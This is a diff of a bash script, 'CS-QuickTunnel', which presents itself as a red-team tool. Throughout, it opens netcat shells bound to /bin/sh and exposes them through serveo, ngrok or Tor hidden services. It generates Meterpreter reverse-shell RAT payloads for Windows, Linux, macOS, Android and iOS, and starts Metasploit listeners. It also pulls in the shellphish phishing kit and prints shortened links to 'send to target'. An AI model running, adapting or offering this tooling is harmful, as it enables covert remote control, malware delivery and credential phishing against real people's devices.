@@ -1,5 +1,5 @@
 #!/bin/bash
-# CS-QuickTunnel v.0.6.9
+# CS-QuickTunnel v.0.7.0
 # Coded by: Cyber Secrets - Information Warfare Center
 # Tool for Red Team ops
 # Github: https://github.com/infosecwriter/CS-QuickTunnel
@@ -11,7 +11,6 @@
 trap 'printf "\n";stop;exit 1' 2
 clear
 OSType=""
-default_port="12345"
 
 startmenu() {
 	banner
@@ -29,28 +28,22 @@ startmenu() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	case $option in
-		99) stop 1 ;;
-		1|01) menussh ;;
-		2|02) ngrokme; menungrok ;; 
-		3|03) servelocalhost ;;
-		9|09) menutor ;;
-		10) menusocat ;;
-		20) menumetasploit ;;
-		30)
-			if [ -d shellphish ]; then 
-				cd shellphish
-				git pull
+		99) 	stop 1 ;;
+		1|01) 	menussh ;;
+		2|02) 	ngrokme; menungrok ;; 
+		9|09) 	menutor ;;
+		10) 	menusocat ;;
+		20) 	menumetasploit ;;
+		30)	if [ -d shellphish ]; then cd shellphish; git pull
 			else 
-				git clone https://github.com/thelinuxchoice/shellphish
-				cd shellphish	
+				git clone https://github.com/thelinuxchoice/shellphish; cd shellphish	
 			fi
 			sleep 3
 			clear
 			bash shellphish.sh
 			startmenu
 			;;
-		90)
-			printf "\e[93mChecking dependencies"
+		90)	printf "\e[93mChecking dependencies"
 			apt update | tee -a dep.log
 			command -v unzip > /dev/null 2>&1 || { apt install unzip | tee -a dep.log; }
 			command -v wget > /dev/null 2>&1 || { apt install wget | tee -a dep.log; }
@@ -92,38 +85,32 @@ menussh() {
 		startmenu
 	fi
 	case $option in
-		1|01)      
-			lip
-			printf "\e[1;93m [!] Reverse tunnel from $remote to localhost port $lport\e[0m\n"
-			serveoitforward
+		1|01)   lip; rip
+			printf "\e[1;93m [!] Reverse tunnel from $rserver:$rport to localhost:$lport\e[0m\n"
+			serveoitforward $lport $rserver $rport
 			;;
-		2|02)      
-			lip			
+		2|02)   lip; rip			
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
-			serveoitforward
+			serveoitforward $lport $rserver $rport
 			menussh
 			;;
-		3|03)   
-			lip   
+		3|03)   lip; rip   
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -lvp -p $lport -e /bin/sh > /dev/null 2>&1 &
-			serveoitforward
+			serveoitforward $lport $rserver $rport
 			;;
-		4|04)      
-			lport="4000"
+		4|04)   lport="4000"
 			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
 			nomachineme
-			serveoitforward
+			serveoitforward $lport $rserver $rport
 			;;
-		5|05)   
-			lip
+		5|05)   lip; rip
 			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
 			vncserver -rfbport $lport
-			serveoitforward
+			serveoitforward $lport $rserver $rport
 			;;
-		10)     
-			lip 
-			serveserveo
+		10)     lip 
+			serveserveo $lport menussh
 			;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -149,40 +136,31 @@ menungrok() {
 		startmenu
 	fi
 	case $option in
-		1|01)      
-			lip
+		1|01)   lip
 			printf "\e[1;93m [!] Reverse tunnel from $remote to localhost port $lport\e[0m\n"
-			ngrokitforward
+			ngrokitforward $lport; menungrok
 			;;
-		2|02)      
-			lip
+		2|02)   lip
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
-			ngrokitforward
+			ngrokitforward $lport; menungrok
 			;;
-		3|03)      
-			lip
+		3|03)   lip
 			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -lvp $lport -e /bin/sh > /dev/null 2>&1 &
-			ngrokitforward
+			ngrokitforward $lport; menungrok
 			;;
-		4|04)      
-			lport="4000"
+		4|04)   lport="4000"
 			printf "\e[1;93m [!] Starting Nomachine on port"$lport"!\e[0m\n"
 			nomachineme
-			ngrokitforward
+			ngrokitforward $lport; menungrok
 			;;
-		5|05)      
-			lip			
+		5|05)   lip			
 			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
 			vncserver -rfbport $lport
-			ngrokitforward
+			ngrokitforward $lport; menungrok
 			;;
-		10)      
-			lip			
-			printf "\e[1;93m [!] Starting PHP Server on port: "$lport"!\e[0m\n"
-			servengrok
-			;;
+		10)     lip; servengrok $lport; menungrok ;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep
@@ -190,7 +168,6 @@ menungrok() {
 		menungrok
 		;;
 	esac
-
 }
 
 menutor() {
@@ -209,57 +186,42 @@ menutor() {
 	printf "\n"
 	read -p $'  Choose an option: \e[37;1m' option
 	printf "\n"
-
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-
 	case $option in
-		1|01) toritforward ;;
-		2|02)      
-			toritforward
-			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
+		1|01) 	lip; toritforward $lport; menutor ;;
+		2|02) 	lip; toritforward $lport; printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			nc -l -p $lport -e /bin/sh > /dev/null 2>&1 &
 			menutor
 			;;
-		3|03)    
-			toritforward  
-			printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
+		3|03)   lip; toritforward $lport; printf "\e[1;93m [!] Starting NetCat Server on port "$lport"!\e[0m\n"
 			echo "nc -lvp $lport -e /bin/sh > /dev/null 2>&1 &" nc.sh
 			hash nc.sh
 			menutor
 			;;
-		4|04)      
-			lport="4000"
-			toritforward
-			nomachineme
+		4|04)   lport="4000"; toritforward $lport; nomachineme; menutor
 			;;
-		5|05)      
-			printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
-			toritforward
+		5|05)   lip; printf "\e[1;93m [!] Starting VNC on port"$lport"!\e[0m\n"
+			toritforward $lport
 			vncserver -rfbport $lport
+			menutor
 			;;
-		10)      
-			printf "\e[1;93m [!] Starting PHP Server on port \e[37;1m"$lport"!\n"
-			servetor
+		10)     lip; servetor $lport; menutor
 			;;
-		11)      
-			systemctl restart tor
+		11)     systemctl restart tor
 			if [[ -e /var/lib/tor/myservices/hostname ]]; then
 				hostname=$(cat /var/lib/tor/myservices/hostname)
-				printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"
+				printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"
 			else
 				printf "\e[91mNo .onion address found\n\n\n"
 			fi
 			printf "\e[92mPress ENTER to continue"; read me
 			menutor
 			;;
-		12)      
-			systemctl restart tor
-			torview
+		12)     systemctl restart tor; torview; menutor
 			;;
-		13)      
-			printf "\e[93mAre you sure?  This can't be reversed without a backup. UPPER CASE 'Y' to delete: "; read me
+		13)     printf "\e[93mAre you sure?  This can't be reversed without a backup. UPPER CASE 'Y' to delete: "; read me
 			printf $me
 			if [[ $me == "Y" ]]; then
 				hostname=""
@@ -269,15 +231,12 @@ menutor() {
 				printf "\e[91mNo change to .onion address"; sleep 3	
 			fi
 			hostname=$(cat /var/lib/tor/myservices/hostname)
-			printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"; sleep 5
+			printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"; sleep 5
 			menutor
 			;;
-		14)      
-			systemctl stop tor
-			tordeview
-			systemctl start tor	
+		14)     systemctl stop tor; tordeview; systemctl start tor; menutor	
 			;;
-		*)
+		*)	
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep 1
 		clear
@@ -298,19 +257,12 @@ menusocat() {
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-	rserver="serveo.net"
-	default_rrserver="towel.blinkenlights.nl"
-	default_rrport="23"
-	lip
-	printf '\e[92mChoose a remote server to forward/pivot to (Example:Server Name)\e[37;1m: ' $default_rrserver
-	read rrserver; rrserver="${rrserver:-${default_rrserver}}"
-	printf '\e[92mChoose a remote port to forward/pivot to (Example:12345)\e[37;1m: ' $default_rrport
-	read rrport; rrport="${rrport:-${default_rrport}}"
-	socatitforward
+	lip; rfip
+	socatitforward $lport $rrserver $rrport
 	case $option in
-		1|01) serveoitforward; menusocat ;;
-		2|02) ngrokitforward; menusocat ;;
-		3|03) toritforward; menusocat ;;
+		1|01)	rip;serveoitforward $lport $rserver $rport; menusocat ;;
+		2|02)	ngrokitforward $lport; menusocat ;;
+		3|03)	toritforward $lport; menusocat ;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep 1
@@ -333,9 +285,9 @@ menumetasploit() {
 		startmenu
 	fi
 	case $tunoption in
-		1|01) tunnel="serveoitforward" ;;
-		2|02) tunnel="ngrokitforward" ;;
-		3|03) tunnel="toritforward" ;;
+		1|01)	lip; rip; tunnel="serveoitforward $lport $rserver $rport" ;;
+		2|02)	lip; tunnel="ngrokitforward $lport" ;;
+		3|03)	lip; tunnel="toritforward $lport" ;;
 		*)
 		printf "\e[1;93m [!] Invalid option!\e[0m\n"
 		sleep 1
@@ -373,162 +325,141 @@ menupayloads() {
 	if [[ $option == 99 ]]; then 
 		startmenu
 	fi
-	lip
 	case $option in
-		11)      
-			payload="windows/meterpreter/reverse_tcp"
+		11) 	payload="windows/meterpreter/reverse_tcp"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
 			fileext="exe"
 			OSType="Windows"
 			$tunnel
 			;;
-		12)      
-			payload="windows/meterpreter/reverse_http"
+		12) 	payload="windows/meterpreter/reverse_http"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
 			fileext="exe"
 			OSType="Windows"
 			$tunnel
 			;;
-		13)      
-			payload="windows/meterpreter/reverse_https"
+		13) 	payload="windows/meterpreter/reverse_https"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
 			fileext="exe"
 			OSType="Windows"
 			$tunnel
 			;;
-		14)      
-			payload="windows/meterpreter/reverse_tcp_allports"
+		14) 	payload="windows/meterpreter/reverse_tcp_allports"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
 			fileext="exe"
 			OSType="Windows"
 			$tunnel
 			;;
-		15)      
-			payload="windows/meterpreter/reverse_ipv6_tcp"
+		15) 	payload="windows/meterpreter/reverse_ipv6_tcp"
 			platform="-a x86 --platform windows"
 			filetype="-f exe"
 			fileext="exe"
 			OSType="Windows"
 			$tunnel
 			;;
-		21)      
-			payload="linux/x86/meterpreter/reverse_tcp"
+		21) 	payload="linux/x86/meterpreter/reverse_tcp"
 			platform=""
 			filetype="-f elf"
 			fileext="elf"
 			OSType="Linux"
 			$tunnel
 			;;
-		22)      
-			payload="linux/x86/meterpreter_reverse_http"
+		22) 	payload="linux/x86/meterpreter_reverse_http"
 			platform=""
 			filetype="-f elf"
 			fileext="elf"
 			OSType="Linux"
 			$tunnel
 			;;
-		23)      
-			payload="linux/x86/meterpreter_reverse_https"
+		23)     payload="linux/x86/meterpreter_reverse_https"
 			platform=""
 			filetype="-f elf"
 			fileext="elf"
 			OSType="Linux"
 			$tunnel
 			;;
-		24)      
-			payload="linux/x86/shell/reverse_ipv6_tcp"
+		24)     payload="linux/x86/shell/reverse_ipv6_tcp"
 			platform=""
 			filetype="-f elf"
 			fileext="elf"
 			OSType="Linux"
 			$tunnel
 			;;
-		31)      
-			payload="osx/x86/shell_reverse_tcp"
+		31)     payload="osx/x86/shell_reverse_tcp"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		32)      
-			payload="osx/x64/meterpreter_reverse_http"
+		32)     payload="osx/x64/meterpreter_reverse_http"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		33)      
-			payload="osx/x64/meterpreter_reverse_https"
+		33)     payload="osx/x64/meterpreter_reverse_https"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		34)      
-			payload="osx/x64/dupandexecve/reverse_tcp"
+		34)     payload="osx/x64/dupandexecve/reverse_tcp"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		41)      
-			payload="android/meterpreter/reverse_tcp"
+		41)     payload="android/meterpreter/reverse_tcp"
 			platform=""
 			filetype="R"
 			fileext="apk"
 			OSType="Android"
 			$tunnel
 			;;
-		42)      
-			payload="android/meterpreter/reverse_http"
+		42)     payload="android/meterpreter/reverse_http"
 			platform=""
 			filetype="R"
 			fileext="apk"
 			OSType="Android"
 			$tunnel
 			;;
-		43)      
-			payload="android/meterpreter/reverse_https"
+		43)     payload="android/meterpreter/reverse_https"
 			platform=""
 			filetype="R"
 			fileext="apk"
 			OSType="Android"
 			$tunnel
 			;;
-		44)      
-			payload="android/meterpreter_reverse_tcp"
+		44)     payload="android/meterpreter_reverse_tcp"
 			platform=""
 			filetype="R"
 			fileext="apk"
 			OSType="Android"
 			$tunnel
 			;;
-		51)      
-			payload="apple_ios/aarch64/meterpreter_reverse_tcp"
+		51)     payload="apple_ios/aarch64/meterpreter_reverse_tcp"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		52)      
-			payload="apple_ios/aarch64/meterpreter_reverse_http"
+		52)     payload="apple_ios/aarch64/meterpreter_reverse_http"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
 			OSType="Mac"
 			$tunnel
 			;;
-		53)      
-			payload="apple_ios/aarch64/meterpreter_reverse_https"
+		53)     payload="apple_ios/aarch64/meterpreter_reverse_https"
 			platform=""
 			filetype="-f macho"
 			fileext="macho"
@@ -542,17 +473,40 @@ menupayloads() {
 }
 
 lip() {
-	printf 'Choose a local listening port (Example:12345): ' $default_server
+	default_port="12345"
+	printf '\e[92mChoose a local listening port (Example:12345): ' $default_server
 	read lport
 	lport="${lport:-${default_port}}"
 }
 
+rip() {
+	default_rserver="serveo.net"
+	default_rport="12345"
+	printf '\e[92mChoose a remote server to recieve from (Example:'$default_rserver')\e[37;1m: '
+	read rserver
+	rserver="${rserver:-${default_rserver}}"
+	printf '\e[92mChoose a remote port to send to (Example:'$default_rport')\e[37;1m: ' 
+	read rport
+	rport="${rport:-${default_rport}}"
+}
+
+rfip() {
+	default_rrserver="towel.blinkenlights.nl"
+	default_rrport="23"
+	printf '\e[92mChoose a remote server to forward/pivot to (Example:'$default_rrserver')\e[37;1m: ' $default_rrserver
+	read rrserver
+	rrserver="${rrserver:-${default_rrserver}}"
+	printf '\e[92mChoose a remote port to forward/pivot to (Example:'$default_rrport')\e[37;1m: ' $default_rrport
+	read rrport
+	rrport="${rrport:-${default_rrport}}"
+}
+
 MetasploitMe() {
 	read -p $'\e[92mChoose RAT name with ".'$fileext'" extention: ' pname
-	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$lport"!\e[0m\n"
+	printf "\e[1;93m [!] Starting Metasploit Meterpreter ($OSType) listener on port "$1"!\e[0m\n"
 	rm -rf reverse-connect.sh
 	meterpreter="msfvenom $platform -p $payload LHOST=$rserver LPORT=$rport $filetype -o site/installs/$pname"
-	echo 'msfconsole -x "use exploit/multi/handler; set payload '$payload'; set LPORT '$lport'; set LHOST 127.0.0.1; run;"' > reverse-connect.sh
+	echo 'msfconsole -x "use exploit/multi/handler; set payload '$payload'; set LPORT '$1'; set LHOST 127.0.0.1; run;"' > reverse-connect.sh
 	printf "\e[1;93m [!] To create a meterpreter RAT, RUN \n $meterpreter\n"
 	printf " \e[92mCopy "$pname" to the remote $OSType system \n Then run "$pname"!\n"
 	mkdir site/installs > /dev/null 2>&1
@@ -595,17 +549,16 @@ ngrokme() {
 
 torview() {
 	# Installing Tor browser
-	printf "\e[93m  Testing the address through a the Tor Browser Bundle...  \n   Please be patient...\n   This may take a few minutes...\n"
 	toruser=`cat /etc/passwd | grep -i "kalitor:" | cut -d ":" -f 1`
 	if [[ $toruser == "kalitor" ]]; then
-		printf "   User found\n"
+		printf "\e[1;93m  User already configured...\n"
 	else
 		useradd -m kalitor -G sudo -s /bin/bash && echo -e "kalitor\nkalitor\n" | passwd kalitor
 		xhost si:localuser:kalitor
 	fi
 	if [[ -e /home/kalitor/tor-browser_en-US/start-tor-browser.desktop ]]; then
 		# Stalling while route is built to Tor2Web
-		printf "\n"
+		printf ""
 	else
 		printf "\e[93m Downloading the Tor Browser for ease of use"
 		rm tor-browser-linux64-8.0.3*
@@ -616,34 +569,33 @@ torview() {
 	fi
 	timex
 	checkphp=$(ps aux | grep -o "php" | head -n1)
-	if [[ -e /var/lib/tor/myservices/hostname && $checkphp == *'php'* && ! -z "$lport" ]]; then
-		hostname=$(cat /var/lib/tor/myservices/hostname)
-		torhostname=$hostname:$lport
-		printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Tor hidden service hostname is: \e[37;1m$hostname\n\n\n"
+	if [[ ! -z "$2" && $checkphp == *'php'* && ! -z "$1" ]]; then
+		torhostname=$2:$1
+		printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Tor hidden service hostname is: \e[37;1m$2\n\n"
 		cd /home/kalitor/tor-browser_en-US/
+		printf "\e[93m  Testing the address through the Tor Browser Bundle...\n  Please be patient...\n  This may take a few minutes...\n\n\e[1;92m"
 		sudo -u kalitor -H ./start-tor-browser.desktop $torhostname
 		cd $curdir
 	else
-		printf "\e[91mLaunching Tor Browser...\n"
+		printf "\e[93m  Launching Tor Browser...\n  Please be patient...\n  This may take a few minutes...\n\n\e[1;92m"
 		cd /home/kalitor/tor-browser_en-US/
-		sudo -u kalitor -H ./start-tor-browser.desktop cybersec.tv https://duckduckgo.com/?ia=web
+		sudo -u kalitor -H ./start-tor-browser.desktop https://duckduckgo.com cybersec.tv
 		cd $curdir
 	fi
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
-	menutor
 }
 
 timex() {
 	tortimex=0
-	printf "Resolving Tor Network... "
+	printf "  Resolving Tor Network... "
 	while [ $tortimex != 30 ]
 	do
 		sleep 1
 		printf "|"
 		let tortimex++
 	done
-	printf "\n"
+	printf "\n\n"
 }
 
 tordeview() {
@@ -652,24 +604,22 @@ tordeview() {
 	deluser kalitor	
 	rm -rf /home/kalitor
 	# bleachbit -c --preset
-	menutor
 }
 
 toritforward() {
 	# Reverse tunneling with Tor.  You run the server locally.  We just add the config
 	killall tor > /dev/null 2>&1 
 	aa-complain system_tor
-	lport="${lport:-${default_port}}"
-	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
+	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$1"!\e[0m\n"
 	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
 	    sleep 1
 	else
 	    echo "HiddenServiceDir /var/lib/tor/myservices/" >> /etc/tor/torrc
 	fi
-	if (grep -Fxq "HiddenServicePort $lport 127.0.0.1:$lport" /etc/tor/torrc); then
+	if (grep -Fxq "HiddenServicePort $1 127.0.0.1:$1" /etc/tor/torrc); then
 	    sleep 1
 	else
-	    echo "HiddenServicePort $lport 127.0.0.1:$lport" >> /etc/tor/torrc
+	    echo "HiddenServicePort $1 127.0.0.1:$1" >> /etc/tor/torrc
 	fi
 	sed -i 's/#SocksPolicy\ reject\ \*/SocksPolicy\ accept\ \*/g' /etc/tor/torrc
 	killall tor		
@@ -681,7 +631,7 @@ toritforward() {
 	printf "\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external Internet IP address is: \e[37;1m"
 	$eip
 	tip="torsocks curl ipinfo.io/ip"
-	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your Torified external IP address is: \e[37;1m"
+	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Your external Torified IP address is: \e[37;1m"
 	$tip
 	if [[ $eip == $tip ]]; then
 		printf "\e[31;1mTOR FAILED.  IPs are the SAME!!!"
@@ -689,12 +639,12 @@ toritforward() {
 		read me
 	fi	
 	hostname=$(cat /var/lib/tor/myservices/hostname)
-	printf "Here is the path to fortune: \e[37;1m$hostname:$lport\n"
+	printf "Here is the path to fortune: \e[37;1m$hostname:$1\n"
 	timex
 	if  [[ ! -z "$tunnel" ]]; then
 		rserver=$hostname
-		rport=$lport
-		MetasploitMe
+		rport=$1
+		MetasploitMe $1 $rserver $rport
 	fi
 	if [[ $OSType == "Linux" ]]; then
 		read -p $"Would you like to test the Linux RAT? (Y)" testme 
@@ -704,29 +654,27 @@ toritforward() {
 		fi
 	else
 		printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-		echo 'torsocks nc '$hostname $lport > reverse-tor-connect.sh
-		echo 'nc '$rserver $rport > reverse-ngrok-connect.sh
-		chmod +x reverse-ngrok-connect.sh
-		xterm ./reverse-ngrok-connect.sh &
+		echo 'torsocks nc '$hostname $1 > reverse-tor-connect.sh
+		chmod +x reverse-tor-connect.sh
+		xterm ./reverse-tor-connect.sh &
 	fi
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
-	menutor
 }
 
 ngrokitforward() {
 	printf "\e[92mStarting NGROK tunnel...\e[0m\n"
-	./ngrok tcp $lport > /dev/null 2>&1 &
+	./ngrok tcp $1 > /dev/null 2>&1 &
 	sleep 5
 	rport=$(curl -s -N http://127.0.0.1:4040/status | grep -o "tcp.ngrok.io:[0-9].\{4\}" | cut -d ":" -f 2) 
 	rserver="tcp.ngrok.io"
 	printf "\e[1;92m[\e[0m*\e[1;92m] Your new server:\e[0m\e[1;77m %s\e[0m\n" $rserver:$rport
 	printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
 	if  [[ ! -z "$tunnel" ]]; then
-		MetasploitMe
+		MetasploitMe $1 $rserver $rport
 	fi
 	if [[ $OSType == "Linux" ]]; then
-		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
+		read -p $"Would you like to test the Linux RAT? (Y)" testme 
 		if [[ $testme == "y" || $testme == "Y" ]]; then
 			echo "./site/installs/$pname" > testme.sh
 			bash testme.sh &
@@ -738,21 +686,16 @@ ngrokitforward() {
 	fi
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
-	menungrok
 }
 
 socatitforward() {
-	socat tcp-listen:$lport,reuseaddr,fork TCP:$rrserver:$rrport &
+	socat tcp-listen:$1,reuseaddr,fork TCP:$2:$3 &
 }
 
+
 serveoitforward() {
-	default_server="serveo.net"
-	printf '\e[92mChoose a remote SSH server to reverse tunnel from (Example: serveo.net)\e[37;1m: ' $default_server
-	read rserver; rserver="${rserver:-${default_server}}"
-	printf '\e[92mChoose a remote port on the SSH server (Example:12345)\e[37;1m: ' $default_port
-	read rport; rport="${rport:-${default_port}}"
-	if  [[ ! -z "$tunnel" ]]; then
-		MetasploitMe
+	if  [[ ! -z "$OSType" ]]; then
+		MetasploitMe $1 $2 $3
 	fi
 	if [[ $OSType == "Linux" ]]; then
 		read -p $"\nWould you like to test the Linux RAT? (Y)" testme 
@@ -762,135 +705,104 @@ serveoitforward() {
 		fi
 	else
 		printf "\e[1;92m[\e[0m*\e[1;92m] Opening with NetCat to test port \e[0m\e[1;77m %s\e[0m\n"
-		echo 'sleep 5; nc '$rserver $rport > reverse-serveo-connect.sh
+		echo 'sleep 5; nc '$2 $3 > reverse-serveo-connect.sh
 		chmod +x reverse-serveo-connect.sh
 		xterm ./reverse-serveo-connect.sh &
 	fi
 	printf "\e[92mStarting tunnel...\e[0m\n"
-	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $rport:localhost:$lport $rserver
+	ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R $3:localhost:$1 $2
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read me
-	menussh
 }
 
+
 serveserveo() {
-	# SHELLPHISH, AUTHOR: @thelinuxchoice
-	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
+	# Modified from SHELLPHISH, AUTHOR: @thelinuxchoice
+	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local PHP server on port \e[97m\e[5m$1 \e[25m...\n"
+	cd site && php -S 127.0.0.1:$1 > /dev/null 2>&1 & 
 	sleep 2
-	printf "\e[92mStarting server...\e[0m\n"
-	command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
 	if [[ -e sendlink ]]; then
 		rm -rf sendlink
 	fi
-	$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$lport' serveo.net 2> /dev/null > sendlink ' &
+	$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$1' serveo.net 2> /dev/null > sendlink ' &
 	printf "\n"
 	sleep 10
 	send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
-	printf "\n"
-	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
+	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n\n' $send_link
 	send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
-	printf "\n"
-	firefox $send_link $send_link/installs.php
-	menussh
-}
-
-servelocalhost() {
-	lip
-	# SHELLPHISH, AUTHOR: @thelinuxchoice
-	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
-	sleep 2
-	printf "\e[92mStarting server...\e[0m\n"
-	command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not installed. Install it. Aborting."; exit 1; }
-	if [[ -e sendlink ]]; then
-		rm -rf sendlink
-	fi
-	printf "ssh -R 80:localhost:$lport ssh.localhost.run 2> /dev/null > sendlink "
-	$(which sh) -c 'ssh -R 80:localhost:'$lport' ssh.localhost.run 2> /dev/null > sendlink ' &
-	printf "\n"
-	sleep 10
-	send_link=$(grep -o "https://[0-9a-z]*\.localhost.run" sendlink)
-	printf "\n"
-	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s \n' $send_link
-	send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
-	printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
+	printf '\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 	printf "\n"
 	firefox $send_link $send_link/installs.php
 	read me
-	startmenu
+	$2
 }
 
 servengrok() {
 	ngrokme
-	printf "\e[92mStarting PHP server...\n"
-	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
+	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local PHP server on port \e[97m\e[5m$1 \e[25m...\n"
+	cd site && php -S 127.0.0.1:$1 > /dev/null 2>&1 & 
 	sleep 2
 	printf "\e[92mStarting ngrok server...\n"
-	./ngrok http $lport > /dev/null 2>&1
-	sleep 10
+	./ngrok http $1 > /dev/null 2>&1 &
+	sleep 5
 	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-	printf "\e[92mYour new server: \e[37;1m$link\n" 
+	printf "\e[92m Your new server: \e[37;1m$link\n" 
+	printf "\n"
 	printf "\e[92mOpening with Firefox in 3 seconds\n"
 	sleep 3 
 	firefox $link $link/installs.php
 	printf "\e[92mPress enter to return to main menu or CTRL+C to end session\n"
 	read waitforngrok
-	menungrok
 }
 
 servetor() {
+	printf "\e[1;93m"
 	aa-complain system_tor
 	systemctl restart apparmor
 	systemctl restart tor
-	printf '\e[92mChoose a listening port (Example:12345): \e[37;1m' $default_port
-	read lport
-	lport="${lport:-${default_port}}"
-	printf "\n\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-	cd site && php -S 127.0.0.1:$lport > /dev/null 2>&1 & 
+	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local PHP server on port \e[97m\e[5m$1 \e[25m...\n"
+	cd site && php -S 127.0.0.1:$1 > /dev/null 2>&1 & 
 	sleep 2
-	printf "\e[1;93m [!] Starting Tor Hidden Server on port "$lport"!\e[0m\n"
+	printf "\e[1;92m[\e[0m*\e[1;92m] Setting up Tor hidden service... \n"
 	if (grep -Fxq "HTTPTunnelPort 0.0.0.0:9080" /etc/tor/torrc); then
-	    sleep 1
+	    	sleep 1
 	else
-	    echo "HTTPTunnelPort 0.0.0.0:9080" >> /etc/tor/torrc
+	    	echo "HTTPTunnelPort 0.0.0.0:9080" >> /etc/tor/torrc
 	fi
 	if (grep -Fxq "HiddenServiceDir /var/lib/tor/myservices/" /etc/tor/torrc); then
-	    sleep 1
+	    	sleep 1
 	else
-	    echo "HiddenServiceDir /var/lib/tor/myservices/" >> /etc/tor/torrc
+	    	echo "HiddenServiceDir /var/lib/tor/myservices/" >> /etc/tor/torrc
